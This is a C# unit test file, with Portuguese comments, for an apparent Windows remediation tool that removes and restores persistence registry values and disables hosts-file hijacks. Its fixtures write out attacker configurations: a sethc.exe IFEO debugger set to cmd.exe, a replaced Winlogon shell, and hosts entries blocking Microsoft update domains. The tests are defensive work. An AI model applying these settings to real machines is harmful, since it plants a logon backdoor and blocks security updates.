        var original = handler.Detect(action);
        Assert.StartsWith("present:", original.Value, StringComparison.Ordinal);
        handler.Apply(action);
        Assert.Equal("absent", handler.Detect(action).Value);
        Assert.Null(handler.CheckRestore(action, original));

        // Programa reinstalado no mesmo lugar: Restore não sobrescreve.
        reg.Str(game.Key, "DisplayName", "New Game");
        handler.Restore(action, original);
        Assert.Equal("New Game", reg.Value(game.Key, "DisplayName")!.Data);

        // Cópia adulterada: recusada.
        var file = Directory.GetFiles(Path.Combine(tmp.Path, "quarantine", "security", "registry"), "*.json").Single();
        File.AppendAllText(file, " ");
        Assert.NotNull(handler.CheckRestore(action, original));
    }

    [Fact]
    public void Ifeo_debugger_removal_and_restore()
    {
        using var tmp = new TempDir();
        var reg = new InMemorySecurityRegistry();
        var key = new RegKeyRef(RegHive.HKLM, PersistenceValueHandler.IfeoPath + @"\sethc.exe", RegView.Registry64);
        reg.Str(key, "Debugger", @"C:\Windows\System32\cmd.exe").Str(key, "GlobalFlag", "0", "DWord");
        var found = PersistenceValueHandler.IfeoDebuggers(reg).Single();
        Assert.Equal("sethc.exe", found.Image);
        var handler = new PersistenceValueHandler(reg, tmp.Path, false);
        var action = Instance("security.persistence.machine.remove", new Dictionary<string, string> { ["selection"] = found.Candidate.Selection });
        var (_, journal, exec, resolver) = Engine(handler);
        var run = journal.BeginRun("t", "1");
        Assert.Equal(ExecutionOutcome.Verified, exec.Execute(run, resolver.Resolve([action], T.Ctx), T.Ctx).Single().Outcome);
        Assert.Null(reg.Value(key, "Debugger"));
        Assert.NotNull(reg.Value(key, "GlobalFlag")); // só o Debugger
        Assert.Equal(RevertOutcome.Reverted, exec.RevertRun(run).Single().Outcome);
        Assert.Equal(@"C:\Windows\System32\cmd.exe", reg.Value(key, "Debugger")!.Data);
    }

    [Fact]
    public void User_shell_removal_goes_to_the_callers_profile()
    {
        using var tmp = new TempDir();
        const string sid = "S-1-5-21-1-2-3-1001";
        var reg = new InMemorySecurityRegistry();
        var key = new RegKeyRef(RegHive.HKCU, PersistenceValueHandler.WinlogonPath, RegView.Default, sid);
        reg.Str(key, "Shell", @"C:\x\kiosk.exe");
        var sel = PersistenceValueHandler.UserShell(reg, sid)!.Selection;
        var handler = new PersistenceValueHandler(reg, tmp.Path, otherAccount: true);
        var action = UserProfileScope.Bind(Instance("security.persistence.user.remove", new Dictionary<string, string> { ["selection"] = sel }), sid);
        Assert.Equal(ApplicabilityKind.Applicable, handler.Assess(action, T.Ctx).Kind);
        var original = handler.Detect(action);
        handler.Apply(action);
        Assert.Null(reg.Value(key, "Shell"));
        handler.Restore(action, original);
        Assert.Equal(@"C:\x\kiosk.exe", reg.Value(key, "Shell")!.Data);
    }

    private const string Hosts = "# hosts\r\n127.0.0.1 localhost\r\n0.0.0.0 update.microsoft.com\r\n0.0.0.0 vortex.data.microsoft.com\r\n";

    [Fact]
    public void Hosts_fix_comments_lines_keeps_backup_and_revert_restores_bytes()
    {
        using var tmp = new TempDir();
        var hosts = new FakeHosts { Content = Encoding.UTF8.GetBytes(Hosts) };
        var original = hosts.Content.ToArray();
        var handler = new HostsFileHandler(hosts, tmp.Path);
        var action = Instance("security.hosts.disable-hijack");
        var (_, journal, exec, resolver) = Engine(handler);
        var run = journal.BeginRun("t", "1");
        Assert.Equal(ExecutionOutcome.Verified, exec.Execute(run, resolver.Resolve([action], T.Ctx), T.Ctx).Single().Outcome);
        var text = Encoding.UTF8.GetString(hosts.Content!);
        Assert.Contains(HostsFile.DisabledPrefix + "0.0.0.0 update.microsoft.com", text, StringComparison.Ordinal);
        Assert.Contains("\r\n0.0.0.0 vortex.data.microsoft.com", text, StringComparison.Ordinal);
        Assert.True(File.Exists(Path.Combine(tmp.Path, "quarantine", "security", "hosts", BackupStore.Hash(original) + ".bak")));
        Assert.Equal(RevertOutcome.Reverted, exec.RevertRun(run).Single().Outcome);
        Assert.Equal(original, hosts.Content);
    }

    [Fact]
    public void Hosts_restore_refuses_after_later_edit_and_clean_file_is_untouched()
    {
        using var tmp = new TempDir();
        var hosts = new FakeHosts { Content = Encoding.UTF8.GetBytes(Hosts) };
        var handler = new HostsFileHandler(hosts, tmp.Path);
        var action = Instance("security.hosts.disable-hijack");
        var original = handler.Detect(action);
        handler.Apply(action);
        hosts.Content = [.. hosts.Content!, .. "1.2.3.4 meu.site\r\n"u8.ToArray()];
        Assert.Throws<InvalidOperationException>(() => handler.Restore(action, original));

        var clean = new FakeHosts { Content = Encoding.UTF8.GetBytes("127.0.0.1 localhost\r\n") };
        var h2 = new HostsFileHandler(clean, tmp.Path);
        Assert.Equal(HostsFileHandler.Clean, h2.Detect(action).Value);
        h2.Apply(action);
        Assert.Equal(0, clean.Writes);
        Assert.Equal(ApplicabilityKind.Blocked, new HostsFileHandler(new FakeHosts { Content = [], Reparse = true }, tmp.Path).Assess(action, T.Ctx).Kind);
    }

    [Fact]
    public void Hosts_keeps_utf8_bom()
    {
        using var tmp = new TempDir();
        var hosts = new FakeHosts { Content = [.. Encoding.UTF8.GetPreamble(), .. Encoding.UTF8.GetBytes(Hosts)] };
        var handler = new HostsFileHandler(hosts, tmp.Path);
        handler.Apply(Instance("security.hosts.disable-hijack"));
        Assert.True(hosts.Content!.AsSpan().StartsWith(Encoding.UTF8.GetPreamble()));
    }
}
